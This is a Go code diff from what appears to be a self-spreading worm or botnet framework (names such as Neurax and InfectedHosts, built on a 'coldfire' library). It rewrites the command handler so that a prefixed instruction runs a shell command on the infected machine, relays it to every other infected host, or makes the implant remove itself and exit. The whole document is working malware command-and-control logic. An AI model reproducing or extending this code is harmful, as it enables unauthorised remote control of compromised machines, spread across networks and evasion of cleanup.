@@ -201,29 +201,30 @@ func NeuraxSignal(addr string) {
 }*/
 
 func handle_commmand(cmd string) {
-	send_to_all := false
-	exec_self := true
 	DataSender := coldfire.SendDataUDP
 	if NeuraxConfig.comm_proto == "tcp" {
 		DataSender = coldfire.SendDataTCP
 	}
-	if strings.Fields(cmd)[0] == "x" {
-		send_to_all = true
+	preamble := strings.Fields(cmd)[0]
+	if strings.Contains(preamble, ":") {
 		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
-	}
-	if strings.Fields(cmd)[0] == "nx" {
-		exec_self = false
-		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
-	}
-	if exec_self {
+		if strings.Contains(preamble, "x") {
+			coldfire.CmdOut(cmd)
+		}
+		if strings.Contains(preamble, "a") {
+			for _, host := range InfectedHosts {
+				err := DataSender(host, NeuraxConfig.comm_port, cmd)
+				ReportError("Cannot send command", err)
+			}
+		}
+		if strings.Contains(preamble, "r") {
+			coldfire.Remove()
+			os.Exit(0)
+		}
+	} else {
 		coldfire.CmdOut(cmd)
 	}
-	if send_to_all {
-		for _, host := range InfectedHosts {
-			err := DataSender(host, NeuraxConfig.comm_port, cmd)
-			ReportError("Cannot send command", err)
-		}
-	}
+
 }
 
 func NeuraxOpenComm() {
